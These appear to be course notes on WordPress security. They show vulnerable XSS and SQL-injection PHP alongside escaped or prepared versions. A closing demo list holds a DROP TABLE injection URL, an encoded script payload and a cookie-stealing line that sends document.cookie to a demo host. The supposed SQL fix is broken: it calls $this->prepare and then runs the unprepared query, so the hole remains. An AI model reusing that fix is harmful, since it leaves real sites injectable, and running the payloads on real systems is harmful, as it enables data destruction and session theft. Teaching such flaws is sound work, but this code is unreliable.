## WordPress and Security

* WordPress tends to be secure
* Responses to security vulnerabilities are typically fast
* Assuming that the vulnerability is properly disclosed, most issues can be migitated quickly
* WordPress, in some circles, has a reputation for security weaknesses. This tends to be due to people installing plugins and themes that include these weaknesses, as opposed to WordPress itself

## Common Security Issues

### Cross Site Scripting (XSS)

* Allows attacker to inject client side script (JS) into a site
* Occurs when content printed to the screen is not properly escaped
* The following is exploitable with domain.com/?s=PHNjcmlwdD5hbGVydCgiSSBvd24gdGhpcyBzaXRlISIpOzwvc2NyaXB0Pg==

```php
function xss_all_the_things() {
	if ( is_search() ) {
		// Get the "s" parameter from the URL which can be anything
		$s = $_GET['s'];

		// Decode it
		$content = base64_decode( $s );

		// Print it
		echo $content;
	}
}

add_action( 'wp_footer', 'xss_all_the_things' );
```

* To prevent, always escape *all* content printed to the screen
* Common functions: `esc_url`, `esc_attr`, `esc_html`, `wp_kses_post`
* Previous example is rendered useless with:

```php
function xss_all_the_things() {
	if ( is_search() ) {
		// Get the "s" parameter from the URL which can be anything
		$s = $_GET['s'];

		// Decode it
		$content = base64_decode( $s );

		// Print it after escaping the important characters
		echo esc_html( $content );
	}
}

add_action( 'wp_footer', 'xss_all_the_things' );
```

### SQL injection

* Allows an attacker to execute arbitrary queries against a database.
* Occurs when SQL queries are not properly sanitized or prepared

```php
function sql_injection_ftw() {
	global $wpdb;

	// Grab the ID from the query variable
	$id = $_GET['id'];

	// Create the query and run it
	$sql = "SELECT * FROM wp_posts WHERE ID = $id";
	$results = $wpdb->query( $sql );

	// Display the results
	foreach ( $results as $key => $result ) {
		echo esc_html( $result->post_title ) . '<br />';
	}
}

add_action( 'wp_footer', 'sql_injection_ftw' );
```

* To prevent, use the WordPress APIs
* Sanitize/validate all input sent to the database
* Prepare your queries

```php
function sql_injection_ftw() {
	global $wpdb;

	// Grab the ID from the query variable
	$id = $_GET['id'];

	// Sanitize the variable
	$clean_id = absint( $id );

	// Create the query and run it
	$sql = "SELECT * FROM wp_posts WHERE ID = %s";

	// Prepare the query
	$query = $this->prepare( $sql, $clean_id );

	// Run the query
	$results = $wpdb->query( $sql );

	// Display the results
	foreach ( $results as $key => $result ) {
		echo esc_html( $result->post_title ) . '<br />';
	}
}

add_action( 'wp_footer', 'sql_injection_ftw' );
```

* Important demo strings

* http://wdim393f.dev/?s=2; DROP%20TABLE%20wp_links
* PHNjcmlwdD5hbGVydCgiSSBvd24gdGhpcyBzaXRlISIpOzwvc2NyaXB0Pg==
* var i = new Image(); i.src='http://wdim393f.dev/?testing=' + encodeURIComponent( document.cookie ); 